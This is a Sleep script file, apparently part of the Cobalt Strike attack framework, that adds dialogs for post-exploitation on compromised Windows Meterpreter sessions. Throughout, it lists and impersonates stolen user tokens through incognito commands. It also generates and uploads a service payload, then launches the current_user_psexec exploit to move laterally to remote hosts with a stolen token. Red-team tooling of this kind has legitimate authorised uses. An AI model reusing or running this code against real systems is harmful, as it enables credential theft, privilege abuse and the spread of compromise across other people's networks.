#
# Token Stealing...
#

import java.awt.*;
import java.awt.event.*;

import javax.swing.*;

sub updateTokenList {
	# update the dialog to indicate that things are changing...
	[$3 setEnabled: 0];
	[$3 setText: "Grabbing tokens..."];

	# setup incognito and list the tokens...
	m_cmd_callback($1, "use incognito", {});
	m_cmd_callback($1, "sysinfo", {});
	m_cmd_callback($1, "sysinfo", {});
	m_cmd_callback($1, "sysinfo", {});
	m_cmd_callback($1, "list_tokens -u", lambda({
		if ($0 eq "end") {
			local('$entry $row $type');
			[$model clear: 32];
			foreach $entry (split("\n", $2)) {
				$entry = ["$entry" trim];
				if ($entry eq "Delegation Tokens Available") {
					$type = "delegation";
				}
				else if ($entry eq "Impersonation Tokens Available") {
					$type = "impersonation";
				}
				else if ($entry ismatch '=*' || $entry eq "No tokens available" || " " isin $entry) {
					# do nothing...	
				}
				else if ($entry ne "") {
					$row = %();
					$row['Token Type'] = $type;
					$row['Name']       = $entry;
					[$model addEntry: $row];
				}
			}
			[$model fireListeners];

			dispatchEvent(lambda({
				[$refresh setEnabled: 1];
				[$refresh setText: "Refresh"];
			}, \$refresh));
		}
	}, $model => $2, $refresh => $3));
}

sub stealToken {
        local('$dialog $table $model $steal $revert $whoami $refresh');
        $dialog = [new JPanel];
        [$dialog setLayout: [new BorderLayout]];

        ($table, $model) = setupTable("Name", @("Token Type", "Name"), @());
	[$table setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
        [$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$steal = [new JButton: "Steal Token"];
	[$steal addActionListener: lambda({
		local('$value');
		$value = [$model getSelectedValue: $table];
		oneTimeShow("impersonate_token");
		m_cmd($sid, "impersonate_token ' $+ $value $+ '");
	}, $sid => $1, \$table, \$model)];

	$revert = [new JButton: "Revert to Self"];
	[$revert addActionListener: lambda({
		oneTimeShow("getuid");
		m_cmd($sid, "rev2self");
		m_cmd($sid, "getuid");
	}, $sid => $1)];

	$whoami = [new JButton: "Get UID"];
	[$whoami addActionListener: lambda({
		oneTimeShow("getuid");
		m_cmd($sid, "getuid");
	}, $sid => $1)];

	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({
		updateTokenList($sid, $model, $refresh);
	}, $sid => $1, \$model, \$refresh)];

	updateTokenList($1, $model, $refresh);

        [$dialog add: center($steal, $revert, $whoami, $refresh), [BorderLayout SOUTH]];
        [$frame addTab: "Tokens $1", $dialog, $null, "Tokens " . sessionToHost($1)];
}

sub refresh_user_tokens {
	local('$host $data $sid $info');

	# clear our table...
	[$1 clear: 128];

	# loop through each session and issue a call to get the user id
	foreach $host => $data (%hosts) {
		if ('sessions' in $data && size($data['sessions']) > 0) {
			foreach $sid => $info ($data['sessions']) {
				if ("payload/windows/meterpreter/*" iswm $info['via_payload']) {
					m_cmd_callback($sid, "getuid", lambda({
						if ($0 eq "end" && "*handle*invalid*" !iswm $2) {
							[$model addEntry: %(Session => $sid, Host => $host, Token => substr(["$2" trim], 17))];
							[$model fireListeners];
						}
					}, $model => $1, $sid => "$sid", $host => "$host"));
				}
			}
		}
	}
}

sub pass_the_token {
	local('$dialog $panel $table $model $scroll $generate @functions %options $help');
	$dialog = dialog("PsExec with User Token", 480, 240);
	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	%options['RHOSTS'] = join(", ", $hosts);

	# users table...
	($table, $model) = setupTable("Session", @("Session", "Host", "Token"), @());
	push(@functions, tableFunction($table, $model));

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: [$scroll getWidth], 100]];
	[[$table getColumn: "Token"] setPreferredWidth: 225];

	refresh_user_tokens($model);

	# create a help button
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-psexec")];

	# some buttons?
	$generate = ui:action_noclose("Launch", @functions, %options, $dialog, lambda({
		local('%o');
		%o['SESSION']  = [$model getSelectedValueFromColumn: $table, "Session"];
		%o['RHOSTS']   = $1['RHOSTS'];
		%o['listener'] = $1['listener']; 
		%o['EXE::Custom'] = $1['EXE::Custom'];
		%o['PAYLOAD']  = fixListenerOptions(%o);

		# close the dialog
		if (!isShift($2)) {
			[$dialog setVisible: 0];
		}

		# if there is no custom EXE... let's do one (this *is* Cobalt Strike after all)
		if (%o['EXE::Custom'] eq "" && %o["TECHNIQUE"] ne "PSH") {
			%o['output'] = "Windows Service EXE";
			generateSafePayload(randomArtifactName(), %o['PAYLOAD'], %o, $this);
			yield;
			%o['EXE::Custom'] = convertAll($1);
			%o['WfsDelay'] = 30;
			deleteOnExit(%o['EXE::Custom']);
		}

		# safe upload of EXE
		if (%o['EXE::Custom'] ne "") {
			uploadBigFile(%o['EXE::Custom'], $this);
			yield;
			%o['EXE::Custom'] = $1;
		}

		if (%o['PAYLOAD'] is $null && %o['EXE::Custom'] eq "") {
			return;
		}

		module_execute("exploit", "windows/local/current_user_psexec", %o);

		elog("psexec with session " . %o['SESSION'] . " token @ " . %o['RHOSTS']);
	}, \$table, \$model, \$dialog));

	[$dialog add: $scroll, [BorderLayout CENTER]];
	[$dialog add: stack(
				rowLayout(ui:listener_psexec_token("Listener: ", "listener", @functions, %options)), 
				center($generate, $help)), [BorderLayout SOUTH]];

	[$dialog setVisible: 1];
}

sub pass_the_token_psh {
	local('$dialog $panel $table $model $scroll $generate @functions %options $help $x64');
	$dialog = dialog($title, 480, 240);
	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	%options['RHOSTS'] = join(", ", $hosts);

	# users table...
	($table, $model) = setupTable("Session", @("Session", "Host", "Token"), @());
	push(@functions, tableFunction($table, $model));

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: [$scroll getWidth], 100]];
	[[$table getColumn: "Token"] setPreferredWidth: 225];

	refresh_user_tokens($model);

	$x64 = ui:checkbox("Target is an x64 system", "RUN_WOW64", @functions, %options);

	# create a help button
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-psexec")];

	# some buttons?
	$generate = ui:action_noclose("Launch", @functions, %options, $dialog, lambda({
		local('%o');
		%o['SESSION']  = [$model getSelectedValueFromColumn: $table, "Session"];
		%o['RHOSTS']   = $1['RHOSTS'];
		%o['listener'] = $1['listener']; 
		%o['PAYLOAD']  = fixListenerOptions(%o);
		%o['TECHNIQUE'] = "PSH"; # necessary for current_user_psexec
		%o['RUN_WOW64'] = $1['RUN_WOW64'];

		# close the dialog
		if (!isShift($2)) {
			[$dialog setVisible: 0];
		}

		if (%o['PAYLOAD'] is $null && %o['EXE::Custom'] eq "") {
			return;
		}

		module_execute("exploit", $module, %o);

		elog($message . %o['SESSION'] . " token @ " . %o['RHOSTS']);
	}, \$table, \$model, \$dialog, \$module, \$message));

	[$dialog add: $scroll, [BorderLayout CENTER]];
	[$dialog add: stack(
				rowLayout(ui:listener("Listener: ", "listener", @functions, %options, "*windows*")), 
				$x64,
				center($generate, $help)), [BorderLayout SOUTH]];

	[$dialog setVisible: 1];
}
